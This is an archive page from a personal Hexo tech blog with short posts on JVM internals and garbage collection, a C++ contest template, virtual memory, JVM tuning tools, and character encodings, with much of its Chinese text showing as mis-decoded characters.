<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-JVM-intro" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/02/JVM-intro/" class="article-date">
  <time class="dt-published" datetime="2020-12-03T04:17:31.000Z" itemprop="datePublished">2020-12-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/02/JVM-intro/">æ·±å…¥JVM</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="Learn-about-JVM-internals"><a href="#Learn-about-JVM-internals" class="headerlink" title="Learn about JVM internals"></a>Learn about JVM internals</h2><p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=UwB0OSmkOtQ">https://www.youtube.com/watch?v=UwB0OSmkOtQ</a><br>look inside an interpreter</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">while(true) &#123;</span><br><span class="line">	bytecode b = bytecodeStream[pc++]</span><br><span class="line">	switch(b) &#123;</span><br><span class="line">		case iconst_1: push(1); break;</span><br><span class="line">		case iload_0: push(local(0)); break;</span><br><span class="line">		case iadd: push(pop() + pop()); break;</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JVMç»“æ„"><a href="#JVMç»“æ„" class="headerlink" title="JVMç»“æ„"></a>JVMç»“æ„</h2><p><img src="/images/jvm_intro/jvm.png"></p>
<h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><p>Division of Heap into Eden, Survivor and Tenured/Old spaces</p>
<ul>
<li>Minor GC: Collecting garbage from Young space (consisting of Eden and Survivor spaces) is called a Minor GC. </li>
<li>Major GC is cleaning the Tenured space.</li>
<li>Full GC is cleaning the entire Heap â€“ both Young and Tenured spaces.<br><img src="/images/jvm_intro/gc.png"></li>
</ul>
<h2 id="å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆæ ¹å¯è¾¾ï¼‰"><a href="#å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆæ ¹å¯è¾¾ï¼‰" class="headerlink" title="å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆæ ¹å¯è¾¾ï¼‰"></a>å¯è¾¾æ€§åˆ†æç®—æ³•ï¼ˆæ ¹å¯è¾¾ï¼‰</h2><p><img src="/images/jvm_intro/root.png"></p>
<p>python: è®¡æ•°å™¨çš„æ–¹å¼ï¼Œæ²¡æœ‰åŠæ³•å¯¹ç›¸äº’å¼•ç”¨å¯¹è±¡è¿›è¡Œå›æ”¶</p>
<h3 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class B &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		A a1 = new A();</span><br><span class="line">		A a2 = new A();</span><br><span class="line">		A a3 = new A();</span><br><span class="line">		a3 = a1;</span><br><span class="line">		a1 = a2;</span><br><span class="line">		a2 = null;</span><br><span class="line">		a3 = a1;</span><br><span class="line">	&#125; // å½“ä»£ç è¿è¡Œè¿™çš„æ—¶å€™ï¼Œæœ‰å¤šå°‘å¯¹è±¡ç¬¦åˆåƒåœ¾å›æ”¶çš„æ¡ä»¶</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">	long l = 1200L; // ä¸æ˜¯åŸºæœ¬æ•°æ®ç±»å‹--åŒ…è£…ç±»å‹ ç±» å­—èŠ‚ç  long.valueOf(1200)</span><br><span class="line">	// å¦‚æœ l = 12L, æ­£ç¡®ç­”æ¡ˆæ˜¯2ä¸ªï¼Œå› ä¸ºåŒ…è£…ç±»å‹æœ‰ç¼“å­˜</span><br><span class="line">	public void a2() &#123;</span><br><span class="line">		System.out.println(&quot;hello&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/jvm_intro/case1_ans.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/12/02/JVM-intro/" data-id="ckqhp9u6m00073ot0c91084br" data-title="æ·±å…¥JVM" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-ACM-template" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/29/ACM-template/" class="article-date">
  <time class="dt-published" datetime="2020-11-30T04:15:42.000Z" itemprop="datePublished">2020-11-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/29/ACM-template/">acm æ¨¡æ¿</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;bits/stdc++.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">#define _debug(x) &#123; cerr &lt;&lt; &quot;\033[94m&quot; &lt;&lt; __func__ &lt;&lt; &quot; &quot; &lt;&lt; #x &lt;&lt; &quot;: &quot; &lt;&lt; (x) &lt;&lt; &quot;\n\033[0m&quot;; &#125;</span><br><span class="line">#define rep(i, a, b) for (int i = (a); i &lt;= (b); i++)</span><br><span class="line">#define pre(i, b, a) for (int i = (b); i &gt;= (a); i--)</span><br><span class="line">#define clr(x, v) memset(x, v, sizeof (x))</span><br><span class="line">#define all(x) x.begin(), x.end()</span><br><span class="line">#define sz(x) (int) x.size()</span><br><span class="line">#define pb push_back</span><br><span class="line">#define mkp make_pair</span><br><span class="line">#define fi first</span><br><span class="line">#define se second</span><br><span class="line">template&lt;class T&gt; inline void amin(T &amp;x, const T &amp;y) &#123; if (y&lt;x) x=y; &#125;</span><br><span class="line">template&lt;class T&gt; inline void amax(T &amp;x, const T &amp;y) &#123; if (x&lt;y) x=y; &#125;</span><br><span class="line">using ll = signed long long;</span><br><span class="line">using pii = pair&lt;int, int&gt;;</span><br><span class="line">using vi = vector&lt;int&gt;;</span><br><span class="line">using vvi = vector&lt;vi&gt;;</span><br><span class="line">const int inf = 0x3f3f3f3f;</span><br><span class="line">const int MOD = 1e9 + 7;</span><br><span class="line">const int maxn = 700;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    ios::sync_with_stdio(false);</span><br><span class="line">    cin.tie(0);</span><br><span class="line">    int _;</span><br><span class="line">    for(scanf(&quot;%d&quot;,&amp;_);_;_--) &#123;</span><br><span class="line">        solve();</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/29/ACM-template/" data-id="ckqhp9u6i00033ot05xvg49ts" data-title="acm æ¨¡æ¿" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ACM/" rel="tag">ACM</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Virtual-Memory" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/28/Virtual-Memory/" class="article-date">
  <time class="dt-published" datetime="2020-11-28T17:24:51.000Z" itemprop="datePublished">2020-11-28</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/28/Virtual-Memory/">Virtual Memory</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><img src="/images/virtual_mem/intro.png"></p>
<h2 id="Handling-Page-Fault"><a href="#Handling-Page-Fault" class="headerlink" title="Handling Page Fault"></a>Handling Page Fault</h2><ul>
<li>page miss causes page fault (an exception)</li>
<li>page fault handler selects a victim to be evicted(here vp4)</li>
</ul>
<p><img src="/images/virtual_mem/page_fault1.png"></p>
<p><img src="/images/virtual_mem/page_fault2.png"></p>
<h2 id="Tool-for-caching"><a href="#Tool-for-caching" class="headerlink" title="Tool for caching"></a>Tool for caching</h2><ul>
<li><p>uses main memory efficiently<br>  use DRAM as a cache for parts of a virtual address space</p>
</li>
<li><p>DRAM is about <strong>10x</strong> slower than SRAM</p>
</li>
<li><p>Disk is about <strong>10,000x</strong> slower than DRAM<br><img src="/images/virtual_mem/cache.png"></p>
</li>
</ul>
<h2 id="Tool-for-Memory-Management"><a href="#Tool-for-Memory-Management" class="headerlink" title="Tool for Memory Management"></a>Tool for Memory Management</h2><p>Each process gets the same uniform linear address space, simplify memory allocation</p>
<ul>
<li>Each virtual page can be mapped to any physical page</li>
<li>A virtual page can be stored in different physical pages at different time</li>
</ul>
<p>Shared libraries, lib.c is the same code for every process running on the system<br><img src="/images/virtual_mem/manage.png"></p>
<h2 id="Simplify-Linking-and-loading"><a href="#Simplify-Linking-and-loading" class="headerlink" title="Simplify Linking and loading"></a>Simplify Linking and loading</h2><ul>
<li>Linking<ul>
<li>Each program has similar virtual address space</li>
<li>Code, data, and heap always start at the same address</li>
</ul>
</li>
<li>Loading<ul>
<li><strong>execve</strong> allocates virtual pages for <strong>.text</strong> and <strong>.data</strong> sections &amp; create PTEs marked as invalid</li>
<li>The <strong>.text</strong> and <strong>.data</strong> sections are copied, page by page, on demand by the virtual memory system<br><img src="/images/virtual_mem/load.png"></li>
</ul>
</li>
</ul>
<h2 id="isolate-address-spaces"><a href="#isolate-address-spaces" class="headerlink" title="isolate address spaces"></a>isolate address spaces</h2><pre><code>- one process can&#39;t interfere with another&#39;s memory
- user program cannot access privileged kernel information and code
</code></pre>
<h1 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h1><ul>
<li><p>When you load a page from disk into memory, does it also get cached in cached memory hierarchy?<br>Yes, if you load an entire page, that page will be <strong>broken up into 64 bytes blocks and load it into the cache</strong>.<br>So everything you fetch from the memory goes through the cache hierarchy.</p>
</li>
<li><p>How is the virtual address space implemented on disk?<br>Most pages thereâ€™s an option when you allocate a new virtual memory page, you can allocate it so that itâ€™s all zeros, you can say I want to allcoate a page of all zeros. In that case, that page doesnâ€™t need to get stored on disk, itâ€™s just as though it was created on disk and then loaded into memory. <strong>So thoese pages that are all zeros donâ€™t exist on disk.</strong> When pages are modified, pages can be mapped to particular files for example when we load and elf binary, the pages that correspond to the code are actually mapped to the bytes in the binary that contains the code. So when you miss on that page it brings in those code pages. <strong>So pages can be mapped to user level files on disk or not(they can be anonymous and not mapped).</strong> So if theyâ€™re mapped to user level files and you write to a page, then it will get written back to the page that iâ€™s mapped to. <strong>If itâ€™s not mapped to any page, itâ€™s stored in this area called the swap area or the swap file.</strong></p>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/28/Virtual-Memory/" data-id="ckqhp9u6q000k3ot0b90edx55" data-title="Virtual Memory" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-JVM-Opt" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/27/JVM-Opt/" class="article-date">
  <time class="dt-published" datetime="2020-11-28T04:40:54.000Z" itemprop="datePublished">2020-11-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/27/JVM-Opt/">JVM è°ƒä¼˜æ¡ˆä¾‹</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="å‘½ä»¤è¡Œå·¥å…·"><a href="#å‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="å‘½ä»¤è¡Œå·¥å…·"></a>å‘½ä»¤è¡Œå·¥å…·</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">jps -v: æŸ¥æ‰¾javaçš„è¿›ç¨‹ï¼Œè™šæ‹Ÿæœºè¿›ç¨‹çŠ¶å†µå·¥å…·</span><br><span class="line"></span><br><span class="line">-XX é«˜çº§é€‰é¡¹ é’ˆå¯¹å¼€å‘</span><br><span class="line">-XX: +PrintGC (+è¡¨ç¤ºå¼€å¯ï¼Œ-è¡¨ç¤ºå…³é—­)</span><br><span class="line">-XX key=123</span><br><span class="line"></span><br><span class="line">jinfo -flags [pid] æŸ¥çœ‹ VMçš„å‚æ•°</span><br><span class="line">jinfo -flag +PrintGC [pid] è¿è¡Œæ—¶ä¿®æ”¹ VMçš„å‚æ•°</span><br><span class="line"></span><br><span class="line">jstat ç»Ÿè®¡ä¸€äº›ä¿¡æ¯ï¼šæ¯”å¦‚GC</span><br><span class="line">jstat -gc [pid] 2000 10:æ˜¾ç¤ºåƒåœ¾å›æ”¶æƒ…å†µ, æ¯æ¬¡éš”2ç§’é’Ÿï¼Œç»Ÿè®¡10æ¬¡</span><br><span class="line"></span><br><span class="line">jmap å†…å­˜å°è±¡å·¥å…·</span><br><span class="line">jmap -heap</span><br><span class="line">jmap -histo [pid]: æŸ¥æ‰¾å¯¹è±¡</span><br><span class="line"></span><br><span class="line">jstack Javaæ¨æ ˆè·Ÿè¸ªå·¥å…·</span><br><span class="line">jstack [pid]</span><br></pre></td></tr></table></figure>

<p><img src="/images/jvm_opt/problem.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">public class FullGCProblem &#123;</span><br><span class="line"></span><br><span class="line">	private static ScheduledThreadPoolExecutor executor </span><br><span class="line">	= new ScheduledThreadPoolExecutor(50, new ThreadPoolExecutor.DiscardOldestPolicy());</span><br><span class="line"></span><br><span class="line">	public static void main(String[] args) throws Exception &#123;</span><br><span class="line">		// 50ä¸ªçº¿ç¨‹</span><br><span class="line">		executor.setMaximumPoolSize(50);</span><br><span class="line">		while (true) &#123;</span><br><span class="line">			calc();</span><br><span class="line">			Thread.sleep(100);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// å¤šçº¿ç¨‹æ‰§è¡Œè®¡ç®—ä»»åŠ¡</span><br><span class="line">	private static void calc() &#123;</span><br><span class="line">		List&lt;UserInfo&gt; taskList = getAllCardInfo();</span><br><span class="line">		taskList.forEach(userInfo -&gt; &#123;</span><br><span class="line">				executor.scheduledWithFixedDelay(() -&gt; &#123;</span><br><span class="line">					userInfo.user();</span><br><span class="line">				&#125;, 2, 3, TimeUnit.SECONDS);</span><br><span class="line">			&#125;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// æ¨¡æ‹Ÿä»æ•°æ®åº“è¯»å–æ•°æ®ï¼Œè¿”å›</span><br><span class="line">	private static List&lt;UserInfo&gt; getAllCardInfo() &#123;</span><br><span class="line">		List&lt;UserInfo&gt; taskList = new ArrayList&lt;&gt;();</span><br><span class="line">		for (int i = 0; i &lt; 100; i++) &#123;</span><br><span class="line">			UserInfo userInfo = new UserInfo();</span><br><span class="line">			taskList.add(userInfo);</span><br><span class="line">		&#125;</span><br><span class="line">		return taskList;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private static class UserInfo() &#123;</span><br><span class="line">		String name = &quot;kai&quot;;</span><br><span class="line">		int age = 18;</span><br><span class="line">		BigDecimal money = new BigDecimal(99999);</span><br><span class="line"></span><br><span class="line">		public void user() &#123;</span><br><span class="line">			// ä¸šåŠ¡é€»è¾‘ä»€ä¹ˆéƒ½æ²¡åš</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>CPUå ç”¨è¿‡é«˜ï¼Œåƒåœ¾å›æ”¶æœŸåœ¨ç–¯ç‹‚å·¥ä½œ<br>é˜¿é‡Œå¼€å‘æ‰‹å†Œ çº¿ç¨‹å‘½å</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/27/JVM-Opt/" data-id="ckqhp9u6l00063ot0e0jxbqc1" data-title="JVM è°ƒä¼˜æ¡ˆä¾‹" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-character-coding" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/10/character-coding/" class="article-date">
  <time class="dt-published" datetime="2020-11-10T23:03:56.000Z" itemprop="datePublished">2020-11-10</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/10/character-coding/">ASCII,GB2312,Unicode,UTF8,UTF16</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="ASCII-American-Standard-Code-Information-Interchange"><a href="#ASCII-American-Standard-Code-Information-Interchange" class="headerlink" title="ASCII (American Standard Code Information Interchange)"></a>ASCII (American Standard Code Information Interchange)</h2><p><code>å¯è§å­—ç¬¦ 95ä¸ª æ§åˆ¶å­—ç¬¦ 33ä¸ª</code><br><img src="/images/character_coding/ascii.png"></p>
<h2 id="ä¸­æ–‡"><a href="#ä¸­æ–‡" class="headerlink" title="ä¸­æ–‡"></a>ä¸­æ–‡</h2><h3 id="è®¾è®¡å­—ç¬¦é›†GB2312"><a href="#è®¾è®¡å­—ç¬¦é›†GB2312" class="headerlink" title="è®¾è®¡å­—ç¬¦é›†GB2312"></a>è®¾è®¡å­—ç¬¦é›†GB2312</h3><p>åˆ†åŒºç®¡ç†ï¼Œå…±è®¡94ä¸ªåŒºï¼Œæ¯ä¸ªåŒºå«94ä¸ªä½ï¼Œå…±8836ä¸ªç ä½<br>01-09åŒºæ”¶å½•é™¤æ±‰å­—å¤–çš„682ä¸ªå­—ç¬¦t<br>10-15åŒºä¸ºç©ºç™½åŒºï¼Œæ²¡æœ‰ä½¿ç”¨<br>16-55åŒºæ”¶å½•3755ä¸ªä¸€çº§æ±‰å­—ï¼ŒæŒ‰æ‹¼éŸ³æ’åº<br>56-87åŒºæ”¶å½•3008ä¸ªäºŒçº§æ±‰å­—ï¼ŒæŒ‰éƒ¨é¦–/ç¬”ç”»æ’åº<br>99-94åŒºä½ç©ºç™½åŒºï¼Œæ²¡æœ‰ä½¿ç”¨</p>
<h3 id="å­˜å‚¨GB2312"><a href="#å­˜å‚¨GB2312" class="headerlink" title="å­˜å‚¨GB2312"></a>å­˜å‚¨GB2312</h3><p>eg ä¾ƒ 5709</p>
<p>0x57+0xA0ï¼ˆå¤§äº127ï¼Œé¿å¼€asciiç ï¼‰=0xD9<br>0x09+0xA0=0xA9</p>
<p>å¾—åˆ°ä¾ƒçš„GB2312ç : <code>0xD90XA9</code></p>
<h3 id="æ‰©å±•GB2312ï¼šGBK"><a href="#æ‰©å±•GB2312ï¼šGBK" class="headerlink" title="æ‰©å±•GB2312ï¼šGBK"></a>æ‰©å±•GB2312ï¼šGBK</h3><p>æ–°å¢20000ä¸ªæ±‰å­—å’Œç¬¦å·ï¼Œä¸å†è§„å®šåœ°ä½å¤§äº127</p>
<h3 id="æ‰©å±•GBKï¼šGB18030"><a href="#æ‰©å±•GBKï¼šGB18030" class="headerlink" title="æ‰©å±•GBKï¼šGB18030"></a>æ‰©å±•GBKï¼šGB18030</h3><p>æ–°å¢å‡ åƒå°‘æ•°æ°‘æ—å­—ç¬¦</p>
<h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>ä¸åŒå›½å®¶æœ‰ä¸åŒçš„ç¼–ç ï¼ŒUnicodeç»Ÿä¸€æ‰€æœ‰çš„å­—ç¬¦ç¼–ç </p>
<p>ä¸€å¼€å§‹unicodeä½¿ç”¨UCS-2å­—ç¬¦é›†(Universal Character Set)ï¼Œ16ä½å¯è¡¨ç¤º65536ä¸ªå­—ç¬¦<br>ä½†è¿˜æ˜¯æ— æ³•è¡¨ç¤ºä¸–ç•Œä¸Šæ‰€æœ‰çš„å­—ç¬¦<br>åæ¥åˆæœ‰äº†UCS-4å­—ç¬¦é›†ï¼Œç”¨32ä½è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ï¼Œå¯è¡¨ç¤ºè¿‘43äº¿ä¸ªå­—ç¬¦<br>ä½†æ˜¯ç©ºé—´è¿‡å¤§ï¼Œä¸èƒ½æ¥å—</p>
<p><code>Unicodeæ˜¯ç”¨0è‡³65535ä¹‹é—´çš„æ•°å­—æ¥è¡¨ç¤ºæ‰€æœ‰å­—ç¬¦.å…¶ä¸­0è‡³127è¿™128ä¸ªæ•°å­—è¡¨ç¤ºçš„å­—ç¬¦ä»ç„¶è·ŸASCIIå®Œå…¨ä¸€æ ·.65536æ˜¯2çš„16æ¬¡æ–¹.è¿™æ˜¯ç¬¬ä¸€æ­¥.ç¬¬äºŒæ­¥å°±æ˜¯æ€ä¹ˆæŠŠ0è‡³65535è¿™äº›æ•°å­—è½¬åŒ–æˆ01ä¸²ä¿å­˜åˆ°è®¡ç®—æœºä¸­.è¿™è‚¯å®šå°±æœ‰ä¸åŒçš„ä¿å­˜æ–¹å¼äº†.äºæ˜¯å‡ºç°äº†UTF(unicode transformation format),æœ‰UTF-8,UTF-16.</code></p>
<h2 id="UTF-8ç¼–ç ï¼ˆunicode-transformation-formatï¼‰"><a href="#UTF-8ç¼–ç ï¼ˆunicode-transformation-formatï¼‰" class="headerlink" title="UTF-8ç¼–ç ï¼ˆunicode transformation formatï¼‰"></a>UTF-8ç¼–ç ï¼ˆunicode transformation formatï¼‰</h2><p>å°†UCS-4å­—ç¬¦é›†çš„ç ä½åˆ’åˆ†ä¸º4ä¸ªåŒºé—´<br><img src="/images/character_coding/utf8.png"></p>
<p>e.g.<br>ç¼– ï¼ˆunicode 32534) :<br>-&gt;åè¿›åˆ¶ 32534<br>-&gt;äºŒè¿›åˆ¶ 0111 11 1100 01 0110<br>(1110xx 10xx 10xx)<br>-&gt;(1110) 0111 (10)11 1100 (10)01 0110<br>-&gt; e     7    b      c    9      6<br>-&gt; UTF-8: e7 bc 96<br>-&gt; URLç¼–ç : %e7%bc%96</p>
<h2 id="UTF-16ç¼–ç "><a href="#UTF-16ç¼–ç " class="headerlink" title="UTF-16ç¼–ç "></a>UTF-16ç¼–ç </h2><p>åœ¨UnicodeåŸºæœ¬å¤šæ–‡ç§å¹³é¢å®šä¹‰çš„å­—ç¬¦ï¼ˆæ— è®ºæ˜¯æ‹‰ä¸å­—æ¯ã€æ±‰å­—æˆ–å…¶ä»–æ–‡å­—æˆ–ç¬¦å·ï¼‰ï¼Œä¸€å¾‹ä½¿ç”¨2å­—èŠ‚å‚¨å­˜ã€‚è€Œåœ¨è¾…åŠ©å¹³é¢å®šä¹‰çš„å­—ç¬¦ï¼Œä¼šä»¥ä»£ç†å¯¹ï¼ˆsurrogate pairï¼‰çš„å½¢å¼ï¼Œä»¥ä¸¤ä¸ª2å­—èŠ‚çš„å€¼æ¥å‚¨å­˜ã€‚</p>
<p>UTF-16æ¯”èµ·UTF-8ï¼Œå¥½å¤„åœ¨äºå¤§éƒ¨åˆ†å­—ç¬¦éƒ½ä»¥å›ºå®šé•¿åº¦çš„å­—èŠ‚ï¼ˆ2å­—èŠ‚ï¼‰å‚¨å­˜ï¼Œä½†UTF-16å´æ— æ³•å…¼å®¹äºASCIIç¼–ç ã€‚</p>
<p>Java charç±»å‹é‡‡ç”¨UTF-16ç¼–ç è¡¨ç¤ºä¸€ä¸ªä»£ç å•å…ƒ, è¾…åŠ©å¹³é¢å®šä¹‰çš„å­—ç¬¦éœ€è¦ç”¨ä¸¤ä¸ªcharè¡¨ç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">String s = &quot;hi\uD83E\uDF60&quot;;</span><br><span class="line">System.out.println(s);</span><br><span class="line">System.out.println(s.length());</span><br><span class="line">int cpCount = s.codePointCount(0, s.length());</span><br><span class="line">System.out.println(cpCount);</span><br><span class="line">char ch = s.charAt(2);</span><br><span class="line">System.out.println(ch);</span><br><span class="line"></span><br><span class="line">hiğŸ­ </span><br><span class="line">4</span><br><span class="line">3</span><br><span class="line">?</span><br></pre></td></tr></table></figure>

      
